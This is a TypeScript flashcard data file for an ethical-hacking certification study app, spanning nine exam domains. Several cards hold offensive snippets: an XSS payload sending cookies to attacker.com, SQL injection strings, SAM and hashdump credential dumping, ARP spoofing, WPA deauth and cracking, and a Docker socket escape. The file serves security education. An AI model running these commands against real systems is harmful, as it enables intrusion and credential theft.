import { Flashcard } from '../types';
import { DEFAULT_MNEMONIC_SVGS } from './mnemonicVisualsData';

export interface FlashcardCategory {
  id: string; // e.g. 'all', 'domain-1', ..., 'domain-9', 'custom'
  name: string;
  shortName: string;
  domainNumber?: number;
  weight?: number;
  color: string;
}

export const FLASHCARD_CATEGORIES: FlashcardCategory[] = [
  { id: 'all', name: 'All Exam Domains', shortName: 'All', color: 'emerald' },
  { id: 'domain-1', name: 'Domain 1: InfoSec & Ethical Hacking Overview', shortName: 'D1: Overview', domainNumber: 1, weight: 6, color: 'blue' },
  { id: 'domain-2', name: 'Domain 2: Reconnaissance & Footprinting', shortName: 'D2: Recon', domainNumber: 2, weight: 21, color: 'emerald' },
  { id: 'domain-3', name: 'Domain 3: System Hacking & Privilege Escalation', shortName: 'D3: System', domainNumber: 3, weight: 17, color: 'purple' },
  { id: 'domain-4', name: 'Domain 4: Network & Perimeter Hacking', shortName: 'D4: Network', domainNumber: 4, weight: 14, color: 'amber' },
  { id: 'domain-5', name: 'Domain 5: Web Application Hacking', shortName: 'D5: Web App', domainNumber: 5, weight: 16, color: 'rose' },
  { id: 'domain-6', name: 'Domain 6: Wireless Network Hacking', shortName: 'D6: Wireless', domainNumber: 6, weight: 6, color: 'cyan' },
  { id: 'domain-7', name: 'Domain 7: Mobile, IoT & OT Security', shortName: 'D7: Mobile/IoT', domainNumber: 7, weight: 8, color: 'orange' },
  { id: 'domain-8', name: 'Domain 8: Cloud Computing & Containers', shortName: 'D8: Cloud', domainNumber: 8, weight: 6, color: 'indigo' },
  { id: 'domain-9', name: 'Domain 9: Cryptography & Steganography', shortName: 'D9: Crypto', domainNumber: 9, weight: 6, color: 'teal' },
  { id: 'custom', name: 'Custom Created Cards', shortName: 'Custom', color: 'slate' },
];

export const DEFAULT_CEH_FLASHCARDS: Flashcard[] = [
  // DOMAIN 1: InfoSec & Ethical Hacking Overview (6%)
  {
    id: 'fc-d1-01',
    domainId: 'domain-1',
    category: 'Domain 1: InfoSec & Ethical Hacking Overview',
    question: 'What is the primary difference between Black-Box, White-Box, and Gray-Box penetration testing methodologies?',
    answer: 'Black-Box mirrors an external attacker with zero prior architecture knowledge; White-Box provides full source code, schemas, and IP diagrams; Gray-Box simulates an insider or privileged user with partial internal credentials.',
    explanation: 'Black-box tests require extensive reconnaissance and carry high operational costs. White-box testing delivers thorough vulnerability coverage in minimal time. Gray-box accurately simulates authenticated attacks such as disgruntled employees or compromised VPN tokens.',
    hint: 'Think about attacker visibility into source code and internal network topology.',
    mnemonicPrompt: 'Three Inspection Vaults: Solid Black Opaque Vault (Zero Intel), Smoky Tinted Vault (Partial Insider Creds), and Luminous Transparent Glass Vault (Full Blueprints Exposed).',
    mnemonicVisualUrl: DEFAULT_MNEMONIC_SVGS.penTestVaults,
    tags: ['RoE', 'Testing Methodologies', 'Scoping'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d1-02',
    domainId: 'domain-1',
    category: 'Domain 1: InfoSec & Ethical Hacking Overview',
    question: 'Under US Federal Law, which statute criminalizes unauthorized access to a protected computer and exceeding authorized access?',
    answer: 'Computer Fraud and Abuse Act (CFAA) — 18 U.S.C. § 1030.',
    explanation: 'Section 1030 covers intentionally accessing a protected computer without authorization or exceeding authorization to obtain financial records, government data, or damaging protected systems. Always obtain an unambiguous signed Rules of Engagement (RoE) before testing.',
    hint: 'Section 1030 of Title 18.',
    tags: ['Cyber Law', 'CFAA', 'Compliance'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d1-03',
    domainId: 'domain-1',
    category: 'Domain 1: InfoSec & Ethical Hacking Overview',
    question: 'What are the 7 chronological phases of the Lockheed Martin Cyber Kill Chain?',
    answer: '1. Reconnaissance → 2. Weaponization → 3. Delivery → 4. Exploitation → 5. Installation → 6. Command & Control (C2) → 7. Actions on Objectives.',
    explanation: 'Breaking any link in this 7-phase defensive model interrupts the adversary before they accomplish data exfiltration, ransomware encryption, or lateral destruction.',
    hint: 'Recon leads to Weaponization; Delivery enables Exploitation; Installation establishes C2.',
    codeSnippet: 'Recon -> Weaponize -> Deliver -> Exploit -> Install -> C2 -> Actions on Objectives',
    tags: ['Kill Chain', 'Defense in Depth', 'Frameworks'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },

  // DOMAIN 2: Reconnaissance & Footprinting (21%)
  {
    id: 'fc-d2-01',
    domainId: 'domain-2',
    category: 'Domain 2: Reconnaissance & Footprinting',
    question: 'How does an Nmap TCP SYN Stealth Scan (-sS) operate at the packet level, and why is it considered stealthy?',
    answer: 'The scanner sends a TCP SYN packet. If the port is open, target returns SYN/ACK. The scanner immediately replies with RST (Reset) instead of ACK, terminating the connection without completing the 3-way handshake.',
    explanation: 'Because the full 3-way handshake is never completed, traditional application-layer services (like HTTP, FTP, SSH daemons) do not generate connection logs, although modern stateful firewalls still track the incomplete session.',
    hint: 'SYN -> SYN/ACK -> RST (Half-open connection).',
    mnemonicPrompt: 'The Stealth Ghost Handshake: Scanner extends hand (SYN), Server clasps hand (SYN-ACK), Scanner vanishes like smoke dropping a red flag (RST) before handshake seals.',
    mnemonicVisualUrl: DEFAULT_MNEMONIC_SVGS.tcpSynGhost,
    codeSnippet: 'nmap -sS -p- -T4 192.168.1.15 -oN syn_scan.txt',
    tags: ['Nmap', 'TCP Handshake', 'Port Scanning'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d2-02',
    domainId: 'domain-2',
    category: 'Domain 2: Reconnaissance & Footprinting',
    question: 'Which DNS query command and record type requests a complete DNS Zone Transfer from an authoritative nameserver?',
    answer: 'Record type: AXFR. Command: dig axfr @<nameserver_ip> <target_domain> (or host -l <domain> <nameserver_ip>).',
    explanation: 'DNS Zone Transfers replicate all DNS zone files between master and secondary nameservers over TCP port 53. If misconfigured to allow transfers to any IP, attackers instantly map the entire internal/external corporate subnet topology.',
    hint: 'Query over TCP port 53 using the AXFR keyword.',
    codeSnippet: 'dig axfr @ns1.megacorpone.com megacorpone.com\nhost -l megacorpone.com ns1.megacorpone.com',
    tags: ['DNS', 'AXFR', 'Reconnaissance'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d2-03',
    domainId: 'domain-2',
    category: 'Domain 2: Reconnaissance & Footprinting',
    question: 'What TCP flag combination defines an Nmap Xmas scan (-sX), and how does RFC 793 dictate closed vs open port responses?',
    answer: 'Flags set: FIN, PSH, and URG (lit up like a Christmas tree). RFC 793 dictates: Closed ports respond with RST/ACK; Open or Filtered ports drop the packet and send no response at all.',
    explanation: 'Xmas scans bypass simple stateless packet filters that only inspect incoming SYN packets. Note: Microsoft Windows, Cisco, and BSD devices violate RFC 793 by sending RST packets regardless of whether the port is open, making Xmas scans ineffective on Windows.',
    hint: 'FIN + PSH + URG. Open ports remain silent.',
    codeSnippet: 'nmap -sX -p 80,445,3389 target.corp',
    tags: ['Nmap', 'Xmas Scan', 'RFC 793'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d2-04',
    domainId: 'domain-2',
    category: 'Domain 2: Reconnaissance & Footprinting',
    question: 'Which Google Dorking operators locate exposed sensitive backup configuration files or open directories?',
    answer: 'filetype: or ext: for extensions (e.g., ext:conf, ext:bak), intitle:"index of", and inurl:admin.',
    explanation: 'Google Hacking Database (GHDB) queries leverage indexed cache to discover unauthenticated portals, database dumps, and credential repositories without directly probing target network infrastructure.',
    hint: 'Combine filetype/ext with intitle:"index of".',
    codeSnippet: 'site:example.com intitle:"index of" "parent directory" (backup | config | .env)',
    tags: ['Google Dorking', 'OSINT', 'Passive Recon'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },

  // DOMAIN 3: System Hacking & Privilege Escalation (17%)
  {
    id: 'fc-d3-01',
    domainId: 'domain-3',
    category: 'Domain 3: System Hacking & Privilege Escalation',
    question: 'Where are local Windows user account password hashes stored on disk, and where are Active Directory domain hashes stored?',
    answer: 'Local: C:\\Windows\\System32\\config\\SAM (Security Account Manager). Active Directory Domain: C:\\Windows\\NTDS\\ntds.dit.',
    explanation: 'The local SAM database is locked by the OS kernel while running and its hashes are syskey-encrypted. In Active Directory, NTDS.dit stores all domain user and computer account objects, extracted using Volume Shadow Copy (vssadmin) or ntdsutil.',
    hint: 'SAM file for local workstations; ntds.dit file for Domain Controllers.',
    codeSnippet: 'reg save HKLM\\SAM sam.save\nreg save HKLM\\SYSTEM system.save\nsecretsdump.py -sam sam.save -system system.save LOCAL',
    tags: ['Windows Security', 'SAM', 'NTDS.dit', 'Credential Dumping'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d3-02',
    domainId: 'domain-3',
    category: 'Domain 3: System Hacking & Privilege Escalation',
    question: 'What Linux permission bit allows an executable to run with the privileges of the file owner rather than the calling user, and how do you find them?',
    answer: 'SUID (Set User ID) bit (octal 4000). Found via: find / -perm -4000 -type f 2>/dev/null',
    explanation: 'If a binary owned by root has the SUID bit set and allows shell escapes or arbitrary file reads (documented on GTFOBins), an unprivileged user can escalate immediately to root.',
    hint: 'Permission bit represented by -rwsr-xr-x with perm -4000.',
    codeSnippet: 'find / -perm -u=s -type f 2>/dev/null\n# Inspect GTFOBins for binaries like find, vim, cp, bash, nmap',
    tags: ['Linux PrivEsc', 'SUID', 'GTFOBins'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d3-03',
    domainId: 'domain-3',
    category: 'Domain 3: System Hacking & Privilege Escalation',
    question: 'What Windows user privilege allows a service account (such as IIS or SQL) to impersonate a client and elevate to NT AUTHORITY\\SYSTEM?',
    answer: 'SeImpersonatePrivilege (or SeAssignPrimaryTokenPrivilege). Exploited via Potato family tools (JuicyPotato, PrintSpoofer, GodPotato).',
    explanation: 'When a service account with SeImpersonatePrivilege tricks the SYSTEM account into authenticating via RPC/Named Pipes, the attacker captures and impersonates the security token to spawn a SYSTEM shell.',
    hint: 'Check with `whoami /priv`. Named after a starchy root vegetable.',
    codeSnippet: 'whoami /priv\n# Look for SeImpersonatePrivilege -> Enabled\nPrintSpoofer64.exe -i -c cmd.exe',
    tags: ['Privilege Escalation', 'Windows Tokens', 'Potato Exploits'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d3-04',
    domainId: 'domain-3',
    category: 'Domain 3: System Hacking & Privilege Escalation',
    question: 'In Metasploit Meterpreter, which commands dump hashes, migrate to a stable process, and capture keystrokes?',
    answer: 'Dumping: hashdump | Process Migration: migrate <PID> | Keystrokes: keyscan_start and keyscan_dump.',
    explanation: 'Migrating to a native system process like lsass.exe or explorer.exe ensures persistence if the exploited application crashes or terminates.',
    hint: 'hashdump, migrate, keyscan_start.',
    codeSnippet: 'meterpreter > getuid\nmeterpreter > ps\nmeterpreter > migrate 1420\nmeterpreter > hashdump',
    tags: ['Metasploit', 'Meterpreter', 'Post-Exploitation'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },

  // DOMAIN 4: Network & Perimeter Hacking (14%)
  {
    id: 'fc-d4-01',
    domainId: 'domain-4',
    category: 'Domain 4: Network & Perimeter Hacking',
    question: 'How does ARP Spoofing (ARP Poisoning) operate, and what vulnerability in the ARP protocol allows it?',
    answer: 'The attacker sends unsolicited Gratuitous ARP replies mapping their MAC address to the IP address of the default gateway (and vice versa). ARP is stateless and lacks authentication, so victims blindly update their local ARP cache.',
    explanation: 'Once both the gateway and the victim point to the attacker MAC, all bidirectional subnet traffic flows through the attacker, enabling packet sniffing (Wireshark/Ettercap), SSL stripping, and credential interception.',
    hint: 'Gratuitous ARP replies exploit the lack of authentication in ARP.',
    codeSnippet: 'arpspoof -i eth0 -t 192.168.1.50 192.168.1.1\narpspoof -i eth0 -t 192.168.1.1 192.168.1.50',
    tags: ['ARP Poisoning', 'MITM', 'Layer 2 Attacks'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d4-02',
    domainId: 'domain-4',
    category: 'Domain 4: Network & Perimeter Hacking',
    question: 'What are the required header components of a Snort IDS rule?',
    answer: 'Action, Protocol, Source IP, Source Port, Direction Operator (-> or <>), Destination IP, Destination Port.',
    explanation: 'A Snort rule consists of a Rule Header (traffic trajectory) and Rule Options (enclosed in parentheses, specifying content, depth, offset, sid, and rev). Example: alert tcp any any -> 192.168.1.0/24 80 (content:"admin"; sid:1000001; rev:1;)',
    hint: 'action proto src_ip src_port -> dst_ip dst_port (options)',
    codeSnippet: 'alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"SQLi Attempt"; content:"UNION SELECT"; nocase; sid:10001; rev:1;)',
    tags: ['Snort', 'IDS Rules', 'Perimeter Defense'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d4-03',
    domainId: 'domain-4',
    category: 'Domain 4: Network & Perimeter Hacking',
    question: 'What is the difference between Low-Interaction and High-Interaction Honeypots?',
    answer: 'Low-Interaction honeypots simulate only specific services and banners (e.g., Honeyd, Dionaea) with minimal risk; High-Interaction honeypots expose a real operating system and full service stack, capturing 0-day exploits and complete adversary behavior at higher compromise risk.',
    explanation: 'Low-interaction honeypots are easy to maintain but easily fingerprinted by advanced attackers. High-interaction honeypots require containment firewalls and virtualization rollback controls.',
    hint: 'Simulation of ports vs real fully functional OS.',
    tags: ['Honeypots', 'Deception Technology', 'Defensive Ops'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },

  // DOMAIN 5: Web Application Hacking (16%)
  {
    id: 'fc-d5-01',
    domainId: 'domain-5',
    category: 'Domain 5: Web Application Hacking',
    question: 'What are the differences between Reflected XSS, Stored XSS, and DOM-based XSS?',
    answer: 'Reflected: Payload is reflected off the web server in an immediate HTTP response (requires victim to click malicious link). Stored: Payload is permanently saved in the backend database and delivered to every viewer. DOM-based: Vulnerability exists purely client-side in the browser executing JavaScript modifying the document object model.',
    explanation: 'Stored XSS is the most dangerous because every user visiting the affected page executes the payload without clicking external links. DOM XSS occurs entirely client-side without the payload necessarily reaching server logs.',
    hint: 'Reflected = non-persistent HTTP; Stored = persistent DB; DOM = client-side JavaScript execution.',
    codeSnippet: '<script>fetch("http://attacker.com/steal?c=" + document.cookie)</script>',
    tags: ['OWASP', 'XSS', 'Web Security'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d5-02',
    domainId: 'domain-5',
    category: 'Domain 5: Web Application Hacking',
    question: 'How do Union-based SQL Injection and Time-Based Blind SQL Injection differ in their operational feedback mechanisms?',
    answer: 'Union-based SQLi joins attacker query results directly into the HTTP response HTML using UNION SELECT; Time-based Blind SQLi produces no visible error or data in the response, forcing the attacker to infer true/false conditions by injecting artificial database sleep delays.',
    explanation: 'Time-based blind SQLi requires injecting functions like pg_sleep(5), SLEEP(5), or WAITFOR DELAY \'0:0:5\'. If the server response takes 5 seconds, the injected boolean expression evaluated to true.',
    hint: 'Direct visual response in HTML vs measured response latency in seconds.',
    codeSnippet: "' UNION SELECT 1, table_name, column_name FROM information_schema.columns--\n' OR IF(1=1, SLEEP(5), 0)--",
    tags: ['SQL Injection', 'Web Exploitation', 'OWASP A03'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d5-03',
    domainId: 'domain-5',
    category: 'Domain 5: Web Application Hacking',
    question: 'What is Cross-Site Request Forgery (CSRF), and what is the primary defensive mitigation against it?',
    answer: 'CSRF tricks an authenticated user into executing unwanted actions on a trusted web application. Primary mitigation: Cryptographically unpredictable Anti-CSRF Synchronizer Tokens tied to the user session, or SameSite=Strict cookie attributes.',
    explanation: 'Browsers automatically attach session cookies to cross-origin requests. Without anti-CSRF tokens validating form origin, an external site embedding `<img src="bank.com/transfer?amount=1000&to=attacker">` executes the transfer using the victim session.',
    hint: 'Anti-CSRF synchronizer tokens and SameSite cookie flags.',
    tags: ['CSRF', 'Session Security', 'OWASP'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },

  // DOMAIN 6: Wireless Network Hacking (6%)
  {
    id: 'fc-d6-01',
    domainId: 'domain-6',
    category: 'Domain 6: Wireless Network Hacking',
    question: 'What packets must an attacker capture to crack WPA/WPA2-PSK passphrases, and how is the capture accelerated?',
    answer: 'The EAPOL 4-Way Handshake (Message 1 through Message 4). Capture is accelerated by transmitting 802.11 Deauthentication frames (aireplay-ng -0) to disconnect a connected client and force re-association.',
    explanation: 'The 4-way handshake exchanges the ANonce, SNonce, and MIC. The attacker tests dictionary passwords offline against the captured handshake using aircrack-ng or hashcat (hash mode 22000).',
    hint: 'EAPOL 4-way handshake, accelerated by 802.11 deauth frames.',
    codeSnippet: 'airmon-ng start wlan0\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\naireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon\naircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap',
    tags: ['Aircrack-ng', 'WPA2 Handshake', '802.11 Deauth'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d6-02',
    domainId: 'domain-6',
    category: 'Domain 6: Wireless Network Hacking',
    question: 'What is the fundamental architectural flaw that makes WEP (Wired Equivalent Privacy) trivial to crack within minutes?',
    answer: 'WEP uses a short 24-bit Initialization Vector (IV) combined with the RC4 stream cipher. Due to the small keyspace, IVs repeat rapidly, leaking the key stream via Fluhrer-Mantin-Shamir (FMS) / PTW attacks.',
    explanation: 'In busy networks, 24 bits guarantees IV collision within ~5,000 to 10,000 packets. Attackers use ARP replay injection (aireplay-ng -3) to generate thousands of IVs per second.',
    hint: 'Short 24-bit IV reuse combined with RC4 keystream weaknesses.',
    tags: ['WEP', 'IV Collision', 'Wireless Flaws'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },

  // DOMAIN 7: Mobile, IoT & OT Security (8%)
  {
    id: 'fc-d7-01',
    domainId: 'domain-7',
    category: 'Domain 7: Mobile, IoT & OT Security',
    question: 'What tool is standard for decompiling Android APK files into readable Smali and decoded XML resource manifests?',
    answer: 'Apktool (apktool d target.apk). To inspect reconstructed Java source code, combine dex2jar with Jadx or JD-GUI.',
    explanation: 'Apktool decodes the binary AndroidManifest.xml and converts classes.dex to Smali assembly. Security testers inspect exported activities, intent filters, hardcoded API secrets, and debuggable flags.',
    hint: 'apktool d for decoding resources; dex2jar/jadx for Java decompilation.',
    codeSnippet: 'apktool d vulnerable_app.apk -o decoded_apk/\njadx-gui vulnerable_app.apk',
    tags: ['Android Security', 'Apktool', 'Mobile Reverse Engineering'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d7-02',
    domainId: 'domain-7',
    category: 'Domain 7: Mobile, IoT & OT Security',
    question: 'Which lightweight publish/subscribe protocol commonly operates on TCP port 1883 in IoT ecosystems, and what is its primary security vulnerability?',
    answer: 'MQTT (Message Queuing Telemetry Transport). Its primary vulnerability is lack of default encryption and authentication, allowing anonymous subscriptions to wildcard topics (`#`) that expose telemetry and control commands.',
    explanation: 'Port 1883 is unencrypted MQTT; port 8883 is MQTT over TLS (MQTTS). By subscribing to `#`, attackers monitor all sensor readings, GPS coordinates, and administrative actuation packets.',
    hint: 'MQTT protocol on port 1883, vulnerable to wildcard `#` topic snooping.',
    codeSnippet: 'mosquitto_sub -h 192.168.1.100 -p 1883 -t "#" -v',
    tags: ['IoT', 'MQTT', 'Port 1883'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d7-03',
    domainId: 'domain-7',
    category: 'Domain 7: Mobile, IoT & OT Security',
    question: 'Which industrial ICS/SCADA protocol uses TCP port 502, and why is it vulnerable to unauthorized PLC coil overwriting?',
    answer: 'Modbus TCP (Port 502). It lacks any native authentication, integrity validation, or encryption, meaning any device reaching port 502 can issue Function Code 05/15 to force write digital outputs/coils.',
    explanation: 'Modbus was designed in 1979 for isolated serial loops. When ported to TCP/IP on port 502, no cryptographic handshakes were added, allowing trivial replay and spoofed control commands.',
    hint: 'Modbus protocol on TCP port 502.',
    codeSnippet: 'nmap -sS -Pn -p 502 --script modbus-discover 192.168.1.200',
    tags: ['OT/SCADA', 'Modbus', 'Port 502', 'Industrial Control'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },

  // DOMAIN 8: Cloud Computing & Containers (6%)
  {
    id: 'fc-d8-01',
    domainId: 'domain-8',
    category: 'Domain 8: Cloud Computing & Containers',
    question: 'Under the Cloud Shared Responsibility Model, what layer of security is always the customer responsibility across IaaS, PaaS, and SaaS?',
    answer: 'Customer Data classification and access management (IAM, credentials, and data governance).',
    explanation: 'In IaaS, customer owns OS, middleware, and network config. In PaaS, cloud provider manages OS/runtime while customer owns code and data. In SaaS, provider manages application stack, but customer still manages user permissions and stored sensitive data.',
    hint: 'Customer Data and Identity/Access Governance.',
    tags: ['Cloud Model', 'Shared Responsibility', 'IaaS/PaaS/SaaS'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d8-02',
    domainId: 'domain-8',
    category: 'Domain 8: Cloud Computing & Containers',
    question: 'What dangerous container configuration allows an adversary inside a Docker container to break out onto the host operating system?',
    answer: 'Mounting the host Docker socket (/var/run/docker.sock) inside the container or running with the `--privileged` flag.',
    explanation: 'Having access to `/var/run/docker.sock` enables the container to talk to the host Docker daemon, launch a new container mounting host `/` into `/host`, and chroot into host root privileges.',
    hint: 'docker.sock mounting or running with `--privileged`.',
    codeSnippet: 'docker run -v /var/run/docker.sock:/var/run/docker.sock ...\n# Attacker spawns container with host root mounted:\ndocker run -it -v /:/host alpine chroot /host',
    tags: ['Docker Escape', 'Container Security', 'Cloud Exploitation'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },

  // DOMAIN 9: Cryptography & Steganography (6%)
  {
    id: 'fc-d9-01',
    domainId: 'domain-9',
    category: 'Domain 9: Cryptography & Steganography',
    question: 'What is the structural difference between Symmetric and Asymmetric encryption algorithms, and which is used for bulk payload encryption?',
    answer: 'Symmetric uses one identical secret key for both encryption and decryption (e.g. AES, ChaCha20); Asymmetric uses mathematically linked keypairs — public key for encryption, private key for decryption (e.g. RSA, ECC). Symmetric is used for bulk encryption due to high throughput.',
    explanation: 'Asymmetric encryption is computationally expensive (orders of magnitude slower) and is primarily used for key exchange (Diffie-Hellman), digital signatures, and establishing hybrid TLS sessions.',
    hint: 'One single secret shared key vs Public/Private keypair.',
    mnemonicPrompt: 'Diffie-Hellman Color Mixing Key Exchange: Alice & Bob mix private paint with public color base, creating identical shared secret without transmitting key.',
    mnemonicVisualUrl: DEFAULT_MNEMONIC_SVGS.diffieHellmanColorMix,
    tags: ['Cryptography', 'AES', 'RSA', 'Key Exchange'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d9-02',
    domainId: 'domain-9',
    category: 'Domain 9: Cryptography & Steganography',
    question: 'What is Least Significant Bit (LSB) steganography, and how is it detected or extracted using CLI tools?',
    answer: 'LSB replaces the lowest-order bit of color bytes (RGB values in bitmaps or JPEGs) with secret payload bits, causing imperceptible color shifts. Extracted using tools like Steghide, OpenStego, or zsteg.',
    explanation: 'Because altering the 8th bit of an 8-bit color channel (e.g., 254 to 255) is invisible to the human eye, 1 byte of hidden secret can be embedded across every 8 image color bytes.',
    hint: 'Replacing the 8th bit of pixel color bytes. Extracted with steghide/zsteg.',
    codeSnippet: 'steghide embed -cf carrier.jpg -ef secret.txt\nsteghide extract -sf carrier.jpg\nzsteg -a suspicious.png',
    tags: ['Steganography', 'Steghide', 'LSB Insertion'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  },
  {
    id: 'fc-d9-03',
    domainId: 'domain-9',
    category: 'Domain 9: Cryptography & Steganography',
    question: 'What is a Birthday Attack in cryptography, and how does it relate to hash collision probabilities?',
    answer: 'A birthday attack exploits the Birthday Paradox: finding ANY two inputs that produce the identical hash output requires substantially fewer operations (O(2^(n/2))) than finding a pre-image for a specific chosen target (O(2^n)).',
    explanation: 'For an n-bit hash function, finding a collision requires only about 2^(n/2) random evaluations. This is why 128-bit hashes like MD5 were broken (2^64 operations is trivial on modern GPUs).',
    hint: 'Based on the birthday paradox; collision search complexity is 2^(n/2).',
    tags: ['Hash Collision', 'Birthday Paradox', 'MD5/SHA'],
    isMastered: false,
    reviewCount: 0,
    createdAt: '2026-09-01T00:00:00.000Z',
    isCustom: false
  }
];
